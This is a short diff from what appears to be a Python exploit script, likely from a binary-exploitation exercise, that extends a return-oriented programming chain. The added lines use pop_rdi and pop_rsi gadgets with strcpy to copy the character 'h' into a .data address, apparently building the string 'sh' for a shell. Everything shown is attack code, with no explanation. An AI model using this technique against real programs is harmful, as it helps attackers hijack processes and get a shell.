@@ -22,3 +22,11 @@ rop += p64(pop_rsi_pop_r15_ret)
 rop += p64(s_address)
 rop += dummy
 rop += p64(strcpy)
+
+# Copy 'h' to .data section
+rop += p64(pop_rdi_ret)
+rop += p64(write_to + 0x1)
+rop += p64(pop_rsi_pop_r15_ret)
+rop += p64(h_address)
+rop += dummy
+rop += p64(strcpy)
